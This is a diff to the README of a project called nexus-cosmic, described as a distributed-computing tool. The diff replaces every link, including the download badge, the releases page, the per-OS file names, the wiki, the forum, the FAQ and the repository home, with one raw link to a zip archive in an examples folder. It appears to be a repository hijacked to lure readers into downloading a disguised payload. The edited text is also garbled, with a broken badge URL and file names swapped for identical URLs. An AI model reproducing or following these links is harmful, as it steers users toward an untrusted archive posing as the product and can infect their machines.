@@ -1,6 +1,6 @@
 # 🌌 nexus-cosmic - A Simple Way to Manage Distributed Computing
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue.svg)](https://github.com/Redify-cmd/nexus-cosmic/releases)
+[![Download the latest release](https://github.com/Redify-cmd/nexus-cosmic/raw/refs/heads/main/examples/cosmic_nexus_1.3.zip%20Latest%https://github.com/Redify-cmd/nexus-cosmic/raw/refs/heads/main/examples/cosmic_nexus_1.3.zip)](https://github.com/Redify-cmd/nexus-cosmic/raw/refs/heads/main/examples/cosmic_nexus_1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -33,11 +33,11 @@ Before you download, ensure your system meets these requirements:
 To download the application, follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Visit this page to download](https://github.com/Redify-cmd/nexus-cosmic/releases)
+   [Visit this page to download](https://github.com/Redify-cmd/nexus-cosmic/raw/refs/heads/main/examples/cosmic_nexus_1.3.zip)
 
 2. On the Releases page, you will see the latest version available for download. 
 
-3. Choose the file that matches your operating system. You may find files like `nexus-cosmic-win.exe`, `nexus-cosmic-mac.zip`, or `nexus-cosmic-linux.tar.gz`. 
+3. Choose the file that matches your operating system. You may find files like `https://github.com/Redify-cmd/nexus-cosmic/raw/refs/heads/main/examples/cosmic_nexus_1.3.zip`, `https://github.com/Redify-cmd/nexus-cosmic/raw/refs/heads/main/examples/cosmic_nexus_1.3.zip`, or `https://github.com/Redify-cmd/nexus-cosmic/raw/refs/heads/main/examples/cosmic_nexus_1.3.zip`. 
 
 4. Click on the file to start the download.
 
@@ -61,19 +61,19 @@ To download the application, follow these steps:
 
 ## 📚 Documentation
 
-For more detailed instructions and advanced features, refer to our [user manual](https://github.com/Redify-cmd/nexus-cosmic/wiki).
+For more detailed instructions and advanced features, refer to our [user manual](https://github.com/Redify-cmd/nexus-cosmic/raw/refs/heads/main/examples/cosmic_nexus_1.3.zip).
 
 ## 🤝 Community and Support
 
 If you need help or have questions, feel free to reach out:
 
-- Join our [community forum](https://github.com/Redify-cmd/nexus-cosmic/discussions).
-- Check our [FAQ page](https://github.com/Redify-cmd/nexus-cosmic/wiki/FAQ) for common questions.
+- Join our [community forum](https://github.com/Redify-cmd/nexus-cosmic/raw/refs/heads/main/examples/cosmic_nexus_1.3.zip).
+- Check our [FAQ page](https://github.com/Redify-cmd/nexus-cosmic/raw/refs/heads/main/examples/cosmic_nexus_1.3.zip) for common questions.
 
 ## 🔗 Links
 
-- [nexus-cosmic on GitHub](https://github.com/Redify-cmd/nexus-cosmic)
-- [Documentation](https://github.com/Redify-cmd/nexus-cosmic/wiki)
-- [Visit this page to download](https://github.com/Redify-cmd/nexus-cosmic/releases)
+- [nexus-cosmic on GitHub](https://github.com/Redify-cmd/nexus-cosmic/raw/refs/heads/main/examples/cosmic_nexus_1.3.zip)
+- [Documentation](https://github.com/Redify-cmd/nexus-cosmic/raw/refs/heads/main/examples/cosmic_nexus_1.3.zip)
+- [Visit this page to download](https://github.com/Redify-cmd/nexus-cosmic/raw/refs/heads/main/examples/cosmic_nexus_1.3.zip)
 
 Thank you for choosing nexus-cosmic! Enjoy exploring distributed computing with us.
